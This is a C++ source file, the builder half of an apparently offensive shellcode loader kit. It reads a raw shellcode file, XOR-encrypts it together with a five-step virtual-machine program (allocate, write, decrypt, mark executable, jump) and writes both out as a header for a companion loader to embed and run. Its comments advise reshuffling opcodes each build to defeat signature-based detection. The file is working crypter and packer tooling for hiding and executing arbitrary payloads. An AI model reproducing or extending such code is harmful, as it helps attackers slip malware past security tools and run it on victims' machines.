/*
BSD 2-Clause License

Copyright (c) 2026, MochaByte

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 example_builder.cpp : the tiny builder companion to example_loader.cpp.

 Reads a raw shellcode file from argv[1] (typically example/payload.bin),
 then emits a self-contained C++ header on stdout containing:
   - g_ir_blob[]      : the encrypted, opcode-randomized bytecode (5 ops)
   - g_ir_seed        : the 32-bit seed both sides use to derive XOR keys
   - g_ir_payload[]   : the encrypted shellcode bytes
   - g_ir_payload_size: how many bytes the payload is

 The Makefile redirects that header into example/embedded.h, which the
 loader then #include's. Result: a real round-trip where what the builder
 writes is exactly what the loader reads back, decrypts, and runs ^^.

 The bytecode pipeline this produces is the classic loader sequence:
   alloc -> write encrypted -> decrypt in place -> protect RX -> jump.

 Build:
   clang++ -std=c++20 -O2 -I.. example_builder.cpp -o example_builder
 Run:
   ./example_builder example/payload.bin > example/embedded.h
*/

#include "../vm_loader.hpp"

#include <array>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <fstream>
#include <span>
#include <vector>

// Mirror the loader's opcode definition. In a real project this would live in
// a shared header consumed by both sides.
enum class LoaderOp : std::uint8_t {
    AllocRegion   = 0,
    WritePayload  = 1,
    DecryptRegion = 2,
    ProtectRX     = 3,
    ExecRegion    = 4,
};

using OpT = vmkit::Op<LoaderOp>;

// Forward map: real opcode -> randomized opcode written into the bytecode.
// Must be the inverse of the loader's reverse map. Shuffle these around per
// build to defeat opcode-byte signatures.
constexpr vmkit::OpcodeReverseMap forward_map() noexcept {
    vmkit::OpcodeReverseMap m = vmkit::identity_reverse_map();
    m[static_cast<std::uint8_t>(LoaderOp::AllocRegion)]   = 4;
    m[static_cast<std::uint8_t>(LoaderOp::WritePayload)]  = 2;
    m[static_cast<std::uint8_t>(LoaderOp::DecryptRegion)] = 0;
    m[static_cast<std::uint8_t>(LoaderOp::ProtectRX)]     = 1;
    m[static_cast<std::uint8_t>(LoaderOp::ExecRegion)]    = 3;
    return m;
}

// Build one op with its opcode pre-encoded through the forward map.
constexpr OpT make_op(LoaderOp real, std::uint32_t a = 0, std::uint32_t b = 0,
                      std::uint64_t x = 0) noexcept {
    constexpr auto fmap = forward_map();
    OpT op{};
    op.opcode = LoaderOp{fmap[static_cast<std::uint8_t>(real)]};
    op.u32[0] = a;
    op.u32[1] = b;
    op.u64[0] = x;
    return op;
}

// Derive a 32-byte XOR key from a seed. Mix in a constant so identical seeds
// across projects don't produce identical keys. Both sides use this for both
// the bytecode and the payload, so keep it in sync with the loader.
static std::array<std::uint8_t, 32> derive_key(std::uint32_t seed) noexcept {
    std::array<std::uint8_t, 32> key{};
    constexpr std::uint8_t base[6] = {'v', 'm', 'k', 'i', 't', '!'};
    for (std::size_t i = 0; i < key.size(); ++i) {
        key[i] = static_cast<std::uint8_t>(base[i % 6] + (seed & 0xFF) + i * 13);
    }
    return key;
}

// Slurp a binary file into a vector. Used to pull the shellcode in.
static std::vector<std::uint8_t> read_file(const char* path) {
    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f) {
        std::fprintf(stderr, "example_builder: cannot open '%s'\n", path);
        std::exit(1);
    }
    const std::streamsize size = f.tellg();
    f.seekg(0, std::ios::beg);
    std::vector<std::uint8_t> buf(static_cast<std::size_t>(size));
    if (size > 0 && !f.read(reinterpret_cast<char*>(buf.data()), size)) {
        std::fprintf(stderr, "example_builder: failed reading '%s'\n", path);
        std::exit(1);
    }
    return buf;
}

// Print a span as a comma-separated hex array, 16 bytes per line.
static void emit_hex_array(std::span<const std::uint8_t> data) {
    for (std::size_t i = 0; i < data.size(); ++i) {
        std::printf("0x%02X,%s", data[i], (i % 16 == 15) ? "\n  " : " ");
    }
}

int main(int argc, char** argv) {
    if (argc < 2) {
        std::fprintf(stderr, "usage: %s <payload.bin>\n", argv[0]);
        return 1;
    }

    // Pull the plaintext shellcode in.
    auto payload = read_file(argv[1]);
    const std::size_t payload_size = payload.size();

    // The 5-op pipeline the loader will run:
    //   alloc R0 -> write encrypted payload -> decrypt R0 -> protect RX -> jump.
    OpT program[] = {
        make_op(LoaderOp::AllocRegion,   /*region=*/0, /*-*/0, /*size=*/payload_size),
        make_op(LoaderOp::WritePayload,  /*region=*/0, /*size=*/static_cast<std::uint32_t>(payload_size), /*src_off=*/0),
        make_op(LoaderOp::DecryptRegion, /*region=*/0, /*-*/0, /*size=*/payload_size),
        make_op(LoaderOp::ProtectRX,     /*region=*/0, /*-*/0, /*size=*/payload_size),
        make_op(LoaderOp::ExecRegion,    /*region=*/0),
    };

    auto blob = std::span{
        reinterpret_cast<std::uint8_t*>(program),
        sizeof(program),
    };

    // Encrypt both the bytecode and the payload with a key derived from the
    // same seed. Splitting them into two keys is straightforward; we keep one
    // here for simplicity.
    constexpr std::uint32_t seed = 0xC0FFEE;
    const auto key = derive_key(seed);
    vmkit::xor_codec::apply(blob, key);
    vmkit::xor_codec::apply(std::span<std::uint8_t>(payload), key);

    // Emit the self-contained header.
    std::printf("#pragma once\n");
    std::printf("// Generated by example_builder. Do not edit by hand.\n");
    std::printf("// seed = 0x%08X | bytecode = %zu bytes (%zu ops) | payload = %zu bytes\n",
                seed, blob.size(), blob.size() / sizeof(OpT), payload_size);
    std::printf("#include <cstddef>\n");
    std::printf("#include <cstdint>\n\n");

    std::printf("inline constexpr unsigned char g_ir_blob[] = {\n  ");
    emit_hex_array(blob);
    std::printf("\n};\n");
    std::printf("inline constexpr std::uint32_t g_ir_seed = 0x%08Xu;\n\n", seed);

    std::printf("inline constexpr unsigned char g_ir_payload[] = {\n  ");
    emit_hex_array(std::span<const std::uint8_t>(payload));
    std::printf("\n};\n");
    std::printf("inline constexpr std::size_t g_ir_payload_size = %zu;\n", payload_size);
    return 0;
}
